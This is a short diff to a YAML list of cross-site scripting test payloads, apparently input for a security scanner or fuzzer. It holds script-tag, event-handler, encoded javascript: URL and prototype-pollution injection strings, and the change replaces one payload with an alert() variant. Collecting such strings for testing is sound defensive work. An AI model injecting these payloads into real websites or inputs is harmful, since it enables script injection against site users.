@@ -4,7 +4,7 @@ payload:
   - "<b onmouseover=alert('Wufff!')>click me!</b>"
   - "<IMG SRC=j&#X41vascript:alert('test')>"
   - '<script>alert("TEST");</script>'
-  - '><script>evil(111)</script>'
+  - '"><script>alert()</script>'
   - '<img/src=x/onerror=xxx'
   - '"onwheel=ead(111)'
   - '?__proto__[innerHTML]=<img/src/onerror%3dalert(1)>'
